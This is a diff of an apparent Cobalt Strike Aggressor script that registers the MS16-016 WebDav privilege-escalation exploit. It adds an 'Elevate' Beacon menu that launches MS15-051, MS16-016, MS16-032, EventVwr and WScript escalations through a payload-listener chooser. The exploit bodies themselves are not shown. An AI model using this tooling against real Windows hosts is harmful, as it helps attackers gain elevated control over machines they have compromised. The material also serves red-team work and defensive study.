@@ -135,39 +135,40 @@ sub ms16_016_exploit {
 
 beacon_exploit_register("ms16-016", "mrxdav.sys WebDav Local Privilege Escalation (CVE 2016-0051)", &ms16_016_exploit);
 
-# HACK: THIS IS TERRIBLE, AND I FEEL AWFUL ABOUT IT. GET LISTENERS AND SET $LISTENER TO THE FIRST ONE IN THE LIST.
-# TODO: IMPLEMENT PROPER LISTENER CHOICE DIALOG
-# CALVIN
-
-# Listeners is a built in function to list all available listeners
-@listeners = listeners();
-# Set lstnr to the first listener in the list, because that will usually be HTTPS
-$lstnr = @listeners[0];
-
 # Add these menu items to the bottom of the Beacon menu
 popup beacon_bottom {
     # Add submenu for Elevate options
     menu "Elevate" {
         # Add MS15-051 menu option
         item "MS15-051" {
-            # Run ms15_051_exploit function ($1 is always the beacon ID, $lstnr is the listener)
-            ms15_051_exploit($1, $lstnr);
+            # Run ms15_051_exploit function ($1 is always the beacon ID, $target is the listener)
+            openPayloadHelper(lambda({
+                ms15_051_exploit($bid, $1);
+                                     }, $bid => $1));
         }
 
         item "MS16-016" {
-            ms16_016_exploit($1, $lstnr);
+            openPayloadHelper(lambda({
+                ms16_016_exploit($bid, $1);
+                                    }, $bid => $1));
         }
 
         item "MS16-032" {
-            ms16_032_exploit($1, $lstnr);
+            openPayloadHelper(lambda({
+                ms16_032_exploit($bid, $1);
+                                     }, $bid => $1));
         }
 
         item "EventVwr" {
-            eventvwr_exploit($1, $lstnr);
+            openPayloadHelper(lambda({
+                eventvwr_exploit($bid, $1);
+                                     }, $bid => $1));
         }
 
         item "WScript" {
-            wscript_exploit($1, $lstnr);
+            openPayloadHelper(lambda({
+                wscript_exploit($bid, $1);
+                                     }, $bid => $1));
         }
     }
 }
